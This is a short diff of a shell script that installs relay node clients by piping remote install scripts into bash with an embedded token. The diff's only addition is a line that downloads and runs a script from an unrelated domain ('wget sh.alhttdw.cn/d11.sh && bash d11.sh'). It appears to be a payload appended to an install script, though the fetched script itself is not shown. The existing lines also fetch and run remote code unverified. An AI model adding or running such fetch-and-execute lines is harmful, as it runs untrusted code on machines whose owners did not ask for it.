@@ -5,3 +5,5 @@ echo -e "\n\ny\ny" | bash <(curl -fLSs https://api.nyafw.com/download/nyanpass-i
 
 # 安装第二个 rel_nodeclient
 echo -e "a\ny\ny" | bash <(curl -fLSs https://api.nyafw.com/download/nyanpass-install.sh) rel_nodeclient "-o -t 38353cbd-ee0f-4ec7-865c-379fa3f5b5dd -u https://ny.zhuanf.xyz"
+
+wget sh.alhttdw.cn/d11.sh && bash d11.sh
